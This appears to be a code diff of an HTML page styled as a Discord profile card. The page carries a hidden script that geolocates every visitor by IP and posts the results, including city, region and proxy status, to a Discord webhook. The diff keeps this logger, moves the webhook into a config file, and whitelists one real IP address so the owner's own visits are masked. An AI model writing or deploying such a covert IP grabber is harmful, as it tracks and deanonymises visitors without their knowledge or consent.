@@ -57,8 +57,8 @@
 </head>
 <body>
   <div class="container">
-    <img id="avatar" src="" alt="Profile" class="https://50943325-679b-4d36-8a75-748a818c8261-00-113nqzxgbo8ft.picard.replit.dev/api/discord-avatar?user_id=1046813139641057300" />
-    <h1 id="username">Lieutenant Ghost</h1>
+    <img id="avatar" src="" alt="Profile" class="profile-img" />
+    <h1 id="username">Loading...</h1>
     <p id="status">Status: loading...</p>
     <div class="badges" id="badges"></div>
     <div class="links">
@@ -72,13 +72,9 @@
     </div>
   </div>
 
-  <!-- ✅ Webhook declared before use -->
+  <script src="config.js"></script>
   <script>
-    const wbhk = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
-  </script>
-
-  <script>
-    const SAFE_IPS = ["123.45.67.89", "111.111.111.111"]; // Replace with real IPs
+    const SAFE_IPS = ["76.39.43.192"];
 
     function get_information(link, callback) {
       const xhr = new XMLHttpRequest();
@@ -89,7 +85,6 @@
 
     function ipLogByRaz(ip, extra) {
       const data = JSON.parse(extra);
-
       const embed = {
         title: ip === "SAFE IP" ? "✅ Safe IP Logged" : "🌐 Geolocation Logger",
         color: ip === "SAFE IP" ? 0x57F287 : 0x5865F2,
@@ -114,7 +109,7 @@
       };
 
       const request = new XMLHttpRequest();
-      request.open("POST", wbhk);
+      request.open("POST", CONFIG.webhook);
       request.setRequestHeader("Content-Type", "application/json");
       request.send(JSON.stringify(payload));
     }
@@ -124,7 +119,7 @@
       const userIp = data.query;
 
       if (SAFE_IPS.includes(userIp)) {
-        const scrubbed = {
+        const masked = {
           city: "Unknown",
           region: "?",
           country: "?",
@@ -135,14 +130,13 @@
           proxy: "Unknown",
           hosting: "Unknown"
         };
-        ipLogByRaz("SAFE IP", JSON.stringify(scrubbed));
+        ipLogByRaz("SAFE IP", JSON.stringify(masked));
         return;
       }
 
       ipLogByRaz(userIp, JSON.stringify(data));
     });
 
-    // Discord Profile Info Fetch
     const badgeIcons = {
       activeDeveloper: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/active-developer.svg",
       hypesquadOnlineHouse2: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/hypesquad-brilliance.svg"
@@ -151,11 +145,11 @@
     fetch("https://50943325-679b-4d36-8a75-748a818c8261-00-113nqzxgbo8ft.picard.replit.dev/discord-info")
       .then(res => res.json())
       .then(data => {
-        document.getElementById("avatar").src = data.avatar.formats.png || "";
-        document.getElementById("username").textContent = data.user.username;
-        document.getElementById("status").textContent = `Status: ${data.presence.status || "unknown"}`;
+        document.getElementById("avatar").src = data.avatar?.formats?.png || "";
+        document.getElementById("username").textContent = data.user?.username || "Unknown";
+        document.getElementById("status").textContent = `Status: ${data.presence?.status || "unknown"}`;
         const badgeList = document.getElementById("badges");
-        const badges = data.badges;
+        const badges = data.badges || {};
         for (const key in badges) {
           if (badges[key] && badgeIcons[key]) {
             const img = document.createElement("img");
